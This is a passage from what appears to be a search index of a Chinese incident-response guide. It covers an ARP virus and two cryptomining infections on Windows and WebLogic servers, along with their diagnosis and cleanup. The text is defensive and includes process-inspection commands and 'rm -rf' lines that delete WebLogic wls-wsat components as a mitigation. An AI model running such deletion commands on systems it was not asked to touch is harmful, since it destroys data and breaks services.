\u8bbe\u7f6e\u5b8c\uff0c\u4e0d\u7528\u91cd\u542f\u5373\u53ef\u751f\u6548\uff0c137\u7aef\u53e3\u5173\u95ed\uff0c\u89c2\u5bdf\u4e86\u4e00\u4f1a\uff0c\u5bf9\u5916\u53d1\u8d77\u7684\u8bf7\u6c42\u5df2\u6d88\u5931\uff0cCPU\u548c\u7f51\u7edc\u5e26\u5bbd\u6062\u590d\u6b63\u5e38\u3002 0x04 \u9632\u62a4\u63aa\u65bd \u00b6 \u5c40\u57df\u7f51\u5b89\u5168\u9632\u62a4\u4f9d\u7136\u662f\u4e00\u9879\u5f88\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u7f51\u7edc\u7684\u5b89\u5168\u7b56\u7565\uff0c\u4e2a\u4eba/\u670d\u52a1\u5668\u7684\u9632\u6bd2\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62\u75c5\u6bd2\u5165\u4fb5\u3002 \u53e6\u5916\u4e0d\u7ba1\u662f\u4e2a\u4ebaPC\u8fd8\u662f\u670d\u52a1\u5668\uff0c\u603b\u8fd8\u662f\u9700\u8981\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u5b89\u5168\u9632\u62a4\uff1a1\u3001\u5173\u95ed135/137/138/139/445\u7b49\u7aef\u53e3 2\u3001\u66f4\u65b0\u7cfb\u7edf\u8865\u4e01\u3002","title":"\u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/#\u7b2c4\u7bc7arp\u75c5\u6bd2","text":"","title":"\u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/#0x00-\u524d\u8a00","text":"ARP\u75c5\u6bd2\u5e76\u4e0d\u662f\u67d0\u4e00\u79cd\u75c5\u6bd2\u7684\u540d\u79f0\uff0c\u800c\u662f\u5bf9\u5229\u7528arp\u534f\u8bae\u7684\u6f0f\u6d1e\u8fdb\u884c\u4f20\u64ad\u7684\u4e00\u7c7b\u75c5\u6bd2\u7684\u603b\u79f0\uff0c\u76ee\u524d\u5728\u5c40\u57df\u7f51\u4e2d\u8f83\u4e3a\u5e38\u89c1\u3002\u53d1\u4f5c\u7684\u65f6\u5019\u4f1a\u5411\u5168\u7f51\u53d1\u9001\u4f2a\u9020\u7684ARP\u6570\u636e\u5305\uff0c\u4e25\u91cd\u5e72\u6270\u5168\u7f51\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5176\u5371\u5bb3\u751a\u81f3\u6bd4\u4e00\u4e9b\u8815\u866b\u75c5\u6bd2\u8fd8\u8981\u4e25\u91cd\u5f97\u591a\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/#0x01-\u5e94\u6025\u573a\u666f","text":"\u67d0\u5929\u65e9\u4e0a\uff0c\u5c0f\u4f19\u4f34\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u5fae\u4fe1\uff0c\u8bf4192.168.64.76 CPU\u73b0\u5728\u8d1f\u8f7d\u5f88\u9ad8\uff0c\u5728\u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u67e5\u770b\u4e86\u4e00\u4e0b\u8fd9\u53f0\u670d\u52a1\u5668\u7684\u76f8\u5173\u65e5\u5fd7\uff0c\u6d41\u91cf\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u66b4\u6da8\uff0c\u53d1\u73b0\u5927\u91cf137\u7aef\u53e3\u7684UDP\u653b\u51fb\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/#0x02-\u5206\u6790\u8fc7\u7a0b","text":"\u767b\u5f55\u670d\u52a1\u5668\uff0c\u9996\u5148\u67e5\u770b137\u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\uff0c\u8fdb\u7a0bID\u4e3a4\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662fSYSTEM\uff0c\u4e8e\u662f\u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u5168\u76d8\u67e5\u6740\u3002 \u5361\u5df4\u65af\u57fa\u7eff\u8272\u7248\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \u5361\u5df4\u65af\u57fa\u3001360\u6740\u6bd2\u3001McAfee\u67e5\u6740\u65e0\u679c\uff0c\u624b\u5de5\u5c06\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1\u9879\u90fd\u7ffb\u4e86\u4e00\u904d\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u3002 \u672c\u5730\u4e0b\u8f7d\u4e86IpTool\u6293\u5305\u5de5\u5177\uff0c\u7b5b\u9009\u6761\u4ef6\uff1a \u534f\u8bae UDP \u7aef\u53e3 137 \u53ef\u4ee5\u660e\u663e\u7684\u770b\u51fa192.168.64.76\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5f02\u5e38\u7684\uff0c192.168.64.76\u7684\u6570\u636e\u5305\u76ee\u7684\u5730\u5740\uff0c\u4e00\u76f4\u5728\u53d8\uff0c\u76ee\u7684MAC\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u8fd9\u4e2aMAC\u5730\u5740\u5c31\u662f\u7f51\u5173\u7684MAC\u3002 \u7aef\u53e3137\u7684udp\u5305\u662fnetbios\u7684\u5e7f\u64ad\u5305\uff0c\u731c\u6d4b\uff1a\u53ef\u80fd\u662fARP\u75c5\u6bd2\uff0c\u7531\u672c\u673a\u5bf9\u5916\u7684ARP\u653b\u51fb\u3002 \u91c7\u7528\u63aa\u65bd\uff1a\u901a\u8fc7\u501f\u52a9\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\u6765\u5b9e\u73b0\u5c40\u57df\u7f51ARP\u68c0\u6d4b\u53ca\u9632\u5fa1\u529f\u80fd\u3002 \u670d\u52a1\u5668\u5b89\u5168\u72d7Windows\u7248\u4e0b\u8f7d\uff1a http://free.safedog.cn/server_safedog.html \u7f51\u7edc\u9632\u706b\u5899--\u653b\u51fb\u9632\u62a4--ARP\u9632\u706b\u5899\uff1a \u867d\u7136\u6709\u62e6\u622a\u4e86\u90e8\u5206ARP\u8bf7\u6c42\uff0c\u4f46\u6d41\u91cf\u51fa\u53e3\u8fd8\u662f\u6709\u4e00\u4e9b137 UDF\u7684\u6570\u636e\u5305\u3002 \u770b\u6765\u8fd8\u662f\u5f97\u4e0b\u72e0\u62db\uff0c\u5173\u95ed137\u7aef\u53e3\uff1a\u7981\u7528TCP/IP\u4e0a\u7684NetBIOS\u3002 1\uff09\u3001\u7981\u7528Server\u670d\u52a1 2\uff09\u3001\u7981\u7528 TCP/IP \u4e0a\u7684 NetBIOS \u8bbe\u7f6e\u5b8c\uff0c\u4e0d\u7528\u91cd\u542f\u5373\u53ef\u751f\u6548\uff0c137\u7aef\u53e3\u5173\u95ed\uff0c\u89c2\u5bdf\u4e86\u4e00\u4f1a\uff0c\u5bf9\u5916\u53d1\u8d77\u7684\u8bf7\u6c42\u5df2\u6d88\u5931\uff0cCPU\u548c\u7f51\u7edc\u5e26\u5bbd\u6062\u590d\u6b63\u5e38\u3002","title":"0x02 \u5206\u6790\u8fc7\u7a0b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/#0x04-\u9632\u62a4\u63aa\u65bd","text":"\u5c40\u57df\u7f51\u5b89\u5168\u9632\u62a4\u4f9d\u7136\u662f\u4e00\u9879\u5f88\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u7f51\u7edc\u7684\u5b89\u5168\u7b56\u7565\uff0c\u4e2a\u4eba/\u670d\u52a1\u5668\u7684\u9632\u6bd2\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62\u75c5\u6bd2\u5165\u4fb5\u3002 \u53e6\u5916\u4e0d\u7ba1\u662f\u4e2a\u4ebaPC\u8fd8\u662f\u670d\u52a1\u5668\uff0c\u603b\u8fd8\u662f\u9700\u8981\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u5b89\u5168\u9632\u62a4\uff1a1\u3001\u5173\u95ed135/137/138/139/445\u7b49\u7aef\u53e3 2\u3001\u66f4\u65b0\u7cfb\u7edf\u8865\u4e01\u3002","title":"0x04 \u9632\u62a4\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/","text":"\u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u6316\u77ff\u75c5\u6bd2\u5df2\u7ecf\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u4e4b\u4e00\u3002\u75c5\u6bd2\u4f20\u64ad\u8005\u53ef\u4ee5\u5229\u7528\u4e2a\u4eba\u7535\u8111\u6216\u670d\u52a1\u5668\u8fdb\u884c\u6316\u77ff\uff0c\u5177\u4f53\u73b0\u8c61\u4e3a\u7535\u8111CPU\u5360\u7528\u7387\u9ad8\uff0cC\u76d8\u53ef\u4f7f\u7528\u7a7a\u95f4\u9aa4\u964d\uff0c\u7535\u8111\u6e29\u5ea6\u5347\u9ad8\uff0c\u98ce\u6247\u566a\u58f0\u589e\u5927\u7b49\u95ee\u9898\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\u4e0a\u5348\u91cd\u542f\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u7a0b\u5e8f\u542f\u52a8\u5f88\u6162\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u53d1\u73b0cpu\u88ab\u5360\u7528\u63a5\u8fd1100%\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u5360\u7528\u4e25\u91cd\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u200b \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u7a0b\uff1a \u5206\u6790\u8fdb\u7a0b\u53c2\u6570\uff1a wmic process get caption,commandline /value >> tmp.txt TIPS: \u5728windows\u4e0b\u67e5\u770b\u67d0\u4e2a\u8fd0\u884c\u7a0b\u5e8f\uff08\u6216\u8fdb\u7a0b\uff09\u7684\u547d\u4ee4\u884c\u53c2\u6570 \u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a wmic process get caption,commandline /value \u5982\u679c\u60f3\u67e5\u8be2\u67d0\u4e00\u4e2a\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f7f\u7528\u4e0b\u5217\u65b9\u5f0f\uff1a wmic process where caption=\u201dsvchost.exe\u201d get caption,commandline /value \u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u7f6e\u7b49\u4fe1\u606f\u3002 \u8bbf\u95ee\u8be5\u94fe\u63a5\uff1a Temp\u76ee\u5f55\u4e0b\u53d1\u73b0Carbon\u3001run.bat\u6316\u77ff\u7a0b\u5e8f: \u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a 360CERT\uff1a\u5229\u7528WebLogic\u6f0f\u6d1e\u6316\u77ff\u4e8b\u4ef6\u5206\u6790 https://www.anquanke.com/post/id/92223 \u6e05\u9664\u6316\u77ff\u75c5\u6bd2\uff1a\u5173\u95ed\u5f02\u5e38\u8fdb\u7a0b\u3001\u5220\u9664c\u76d8temp\u76ee\u5f55\u4e0b\u6316\u77ff\u7a0b\u5e8f \u3002 \u4e34\u65f6\u9632\u62a4\u65b9\u6848 \u6839\u636e\u5b9e\u9645\u73af\u5883\u8def\u5f84\uff0c\u5220\u9664WebLogic\u7a0b\u5e8f\u4e0b\u5217war\u5305\u53ca\u76ee\u5f55 rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat \u91cd\u542fWebLogic\u6216\u7cfb\u7edf\u540e\uff0c\u786e\u8ba4\u4ee5\u4e0b\u94fe\u63a5\u8bbf\u95ee\u662f\u5426\u4e3a404 http://x.x.x.x:7001/wls-wsat 0x04 \u9632\u8303\u63aa\u65bd \u00b6 \u200b \u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\u3002\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff0c\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0cStruts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"\u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/#\u7b2c5\u7bc7\u6316\u77ff\u75c5\u6bd2\u4e00","text":"","title":"\u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/#0x00-\u524d\u8a00","text":"\u200b \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u6316\u77ff\u75c5\u6bd2\u5df2\u7ecf\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u4e4b\u4e00\u3002\u75c5\u6bd2\u4f20\u64ad\u8005\u53ef\u4ee5\u5229\u7528\u4e2a\u4eba\u7535\u8111\u6216\u670d\u52a1\u5668\u8fdb\u884c\u6316\u77ff\uff0c\u5177\u4f53\u73b0\u8c61\u4e3a\u7535\u8111CPU\u5360\u7528\u7387\u9ad8\uff0cC\u76d8\u53ef\u4f7f\u7528\u7a7a\u95f4\u9aa4\u964d\uff0c\u7535\u8111\u6e29\u5ea6\u5347\u9ad8\uff0c\u98ce\u6247\u566a\u58f0\u589e\u5927\u7b49\u95ee\u9898\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\u4e0a\u5348\u91cd\u542f\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u7a0b\u5e8f\u542f\u52a8\u5f88\u6162\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u53d1\u73b0cpu\u88ab\u5360\u7528\u63a5\u8fd1100%\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u5360\u7528\u4e25\u91cd\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"\u200b \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u7a0b\uff1a \u5206\u6790\u8fdb\u7a0b\u53c2\u6570\uff1a wmic process get caption,commandline /value >> tmp.txt TIPS: \u5728windows\u4e0b\u67e5\u770b\u67d0\u4e2a\u8fd0\u884c\u7a0b\u5e8f\uff08\u6216\u8fdb\u7a0b\uff09\u7684\u547d\u4ee4\u884c\u53c2\u6570 \u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a wmic process get caption,commandline /value \u5982\u679c\u60f3\u67e5\u8be2\u67d0\u4e00\u4e2a\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f7f\u7528\u4e0b\u5217\u65b9\u5f0f\uff1a wmic process where caption=\u201dsvchost.exe\u201d get caption,commandline /value \u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u7f6e\u7b49\u4fe1\u606f\u3002 \u8bbf\u95ee\u8be5\u94fe\u63a5\uff1a Temp\u76ee\u5f55\u4e0b\u53d1\u73b0Carbon\u3001run.bat\u6316\u77ff\u7a0b\u5e8f: \u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a 360CERT\uff1a\u5229\u7528WebLogic\u6f0f\u6d1e\u6316\u77ff\u4e8b\u4ef6\u5206\u6790 https://www.anquanke.com/post/id/92223 \u6e05\u9664\u6316\u77ff\u75c5\u6bd2\uff1a\u5173\u95ed\u5f02\u5e38\u8fdb\u7a0b\u3001\u5220\u9664c\u76d8temp\u76ee\u5f55\u4e0b\u6316\u77ff\u7a0b\u5e8f \u3002 \u4e34\u65f6\u9632\u62a4\u65b9\u6848 \u6839\u636e\u5b9e\u9645\u73af\u5883\u8def\u5f84\uff0c\u5220\u9664WebLogic\u7a0b\u5e8f\u4e0b\u5217war\u5305\u53ca\u76ee\u5f55 rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat \u91cd\u542fWebLogic\u6216\u7cfb\u7edf\u540e\uff0c\u786e\u8ba4\u4ee5\u4e0b\u94fe\u63a5\u8bbf\u95ee\u662f\u5426\u4e3a404 http://x.x.x.x:7001/wls-wsat","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/#0x04-\u9632\u8303\u63aa\u65bd","text":"\u200b \u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\u3002\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff0c\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0cStruts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"0x04 \u9632\u8303\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/","text":"\u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 \u00b6 0x00 \u524d\u8a00 \u00b6 \u4f5c\u4e3a\u4e00\u4e2a\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5de5\u7a0b\u5e08\uff0c\u9047\u5230\u4e86\u6bd4\u8f83\u590d\u6742\u7684\u75c5\u6bd2\u600e\u4e48\u529e\uff1f\u522b\u6015\uff0c\u867d\u7136\u5bf9\u4e8c\u8fdb\u5236\u4e0d\u719f\uff0c\u4f46\u662f\u4f9d\u9760\u7cfb\u7edf\u8fd0\u7ef4\u7684\u7ecf\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u5b83\u3002 0x01 \u611f\u67d3\u73b0\u8c61 \u00b6 1\u3001\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42 2\u3001\u4f7f\u7528\u5404\u79cd\u6740\u6bd2\u8f6f\u4ef6\u67e5\u6740\u65e0\u679c\uff0c\u867d\u7136\u80fd\u8bc6\u522b\u51fa\u5728C:\\Windows\\NerworkDistribution\u4e2d\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6\uff0c\u4f46\u5373\u4f7f\u5220\u9664NerworkDistribution\u540e\uff0c\u6bcf\u6b21\u91cd\u542f\u53c8\u4f1a\u518d\u6b21\u751f\u6210\u3002 \u8fde\u6740\u8f6f\u6e05\u9664\u4e0d\u4e86\u7684\u75c5\u6bd2\uff0c\u53ea\u80fd\u624b\u5de5\u6765\u5427\uff0c\u4e2a\u4eba\u6bd4\u8f83\u504f\u597d\u706b\u7ed2\uff0c\u754c\u9762\u6bd4\u8f83\u7b80\u6d01\uff0c\u529f\u80fd\u4e5f\u633a\u597d\u7528\u7684\uff0c\u81ea\u5e26\u7684\u706b\u7ed2\u5251\u662f\u5b89\u5168\u5206\u6790\u5229\u5668\u3002\u4e8e\u662f\u5b89\u88c5\u4e86\u706b\u7ed2\uff0c\u6709\u4e86\u5982\u4e0b\u5206\u6790\u6392\u67e5\u8fc7\u7a0b\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 A\u3001\u7f51\u7edc\u94fe\u63a5 \u00b6 \u901a\u8fc7\u73b0\u8c61\uff0c\u627e\u5230\u5bf9\u5916\u53d1\u9001\u8bf7\u6c42\u7684\u8fdb\u7a0bID\uff1a4960 B\u3001\u8fdb\u7a0b\u5206\u6790 \u00b6 \u8fdb\u4e00\u6b65\u901a\u8fc7\u8fdb\u7a0bID\u627e\u5230\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\uff0c\u7236\u8fdb\u7a0b\u4e3a1464 \u627e\u5230\u8fdb\u7a0bID\u4e3a1464\u7684\u670d\u52a1\u9879\uff0c\u9010\u4e00\u6392\u67e5\uff0c\u6211\u4eec\u53d1\u73b0\u670d\u52a1\u9879RemoteUPnPService\u5b58\u5728\u5f02\u5e38\u3002 C\u3001\u5220\u9664\u670d\u52a1 \u00b6 \u9009\u62e9\u53ef\u7591\u670d\u52a1\u9879\uff0c\u53f3\u952e\u5c5e\u6027\uff0c\u505c\u6b62\u670d\u52a1\uff0c\u542f\u52a8\u7c7b\u578b\uff1a\u7981\u6b62\u3002 \u505c\u6b62\u5e76\u7981\u7528\u670d\u52a1\uff0c\u518d\u6e05\u9664NerworkDistribution\u76ee\u5f55\u540e\uff0c\u91cd\u542f\u8ba1\u7b97\u673a\u3002\u5f02\u5e38\u8bf7\u6c42\u548c\u76ee\u5f55\u7684\u73b0\u8c61\u6d88\u5931\u3002 \u53c8\u6392\u67e5\u4e86\u51e0\u53f0\uff0c\u73b0\u8c61\u4e00\u81f4\uff0c\u5c31\u662f\u670d\u52a1\u9879\u7684\u540d\u79f0\u6709\u70b9\u53d8\u5316\u3002 D\u3001\u75c5\u6bd2\u6e05\u9664 \u00b6 \u6316\u77ff\u75c5\u6bd2\u6e05\u9664\u8fc7\u7a0b\u5982\u4e0b\uff1a 1\u3001 \u505c\u6b62\u5e76\u7981\u7528\u53ef\u7591\u7684\u670d\u52a1\u9879\uff0c\u670d\u52a1\u9879\u7684\u540d\u79f0\u4f1a\u53d8\uff0c\u4f46\u63cf\u8ff0\u662f\u4e0d\u53d8\u7684\uff0c\u6839\u636e\u63cf\u8ff0\u53ef\u5feb\u901f\u627e\u5230\u53ef\u7591\u670d\u52a1\u9879\u3002 \u200b \u53ef\u7591\u670d\u52a1\u9879\u63cf\u8ff0\uff1aEnables a common interface and object model for the Remote UPnP Service to access \u200b 